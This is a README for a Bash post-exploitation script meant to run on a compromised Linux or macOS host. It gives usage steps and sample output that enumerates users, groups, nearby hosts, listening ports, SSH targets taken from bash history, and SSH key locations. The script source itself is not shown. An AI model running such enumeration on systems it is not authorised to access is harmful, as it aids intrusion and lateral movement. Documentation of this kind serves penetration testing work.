# postex
Minimal non-privileged Linux and MacOS post-exploitation script written in Bash

1. Download the script to a compromised host or copy/paste it through the terminal.
2. Make it executable with: chmod +x ./postex.sh
3. Run it: ./postex.sh
4. Profit!

Example Linux output:
```bash
------------------------------------------------------------------------------------------
[+] hostname FQDN kodi
------------------------------------------------------------------------------------------
[+] kernel version 4.14.26-2-osmc
------------------------------------------------------------------------------------------
[+] CPU arch armv7l
------------------------------------------------------------------------------------------
[+] Linux release OSMC: Open Source Media Center
------------------------------------------------------------------------------------------
[-] No LSB release file present
------------------------------------------------------------------------------------------
[+] current user uid=1000(osmc) gid=1000(osmc) groups=1000(osmc),4(adm),6(disk),7(lp),20(dialout),24(cdrom),29(audio),44(video)
------------------------------------------------------------------------------------------
[+] users in /home/
osmc
------------------------------------------------------------------------------------------
[+] users in /home/ in sudo or adm group
adm:x:4:osmc
------------------------------------------------------------------------------------------
[+] uptime  11:34:36 up 9 days,  1:30,  1 user,  load average: 0.82, 0.51, 0.36
------------------------------------------------------------------------------------------
[+] Checking if number of CPUs mentioned in dmesg
[    0.310730] smp: Brought up 1 node, 4 CPUs
------------------------------------------------------------------------------------------
[+] total memory MemTotal:         764748 kB
------------------------------------------------------------------------------------------
[+] nearby hosts from the ARP table
192.168.1.10
192.168.1.12
192.168.1.43
192.168.1.1
------------------------------------------------------------------------------------------
[+] DNS servers from /etc/resolv.conf
192.168.1.1
------------------------------------------------------------------------------------------
[+] local IP address 192.168.1.45
------------------------------------------------------------------------------------------
[+] external IP address XXX.XXX.XXX.XXX
------------------------------------------------------------------------------------------
[+] default route 192.168.1.1
------------------------------------------------------------------------------------------
[+] local listening ports (non-root)
111
8080
22
36666
36667
9090
------------------------------------------------------------------------------------------
[+] local listening TCP ports (non-root) which are in /etc/services
sunrpc          111/tcp         portmapper      # RPC 4.0 portmapper
http-alt        8080/tcp        webcache        # WWW caching service
ssh             22/tcp                          # SSH Remote Login Protocol
------------------------------------------------------------------------------------------
[+] Bash history present in /home/osmc/.bash_history
[+] SSH commands in bash history
ssh 192.168.1.43
ssh neo@192.168.1.43
ssh neo@192.168.1.43
------------------------------------------------------------------------------------------
[-] No SSH RSA key present in /home/osmc/.ssh/id_rsa
[-] No SSH DSA key present in /home/osmc/.ssh/id_dsa
```
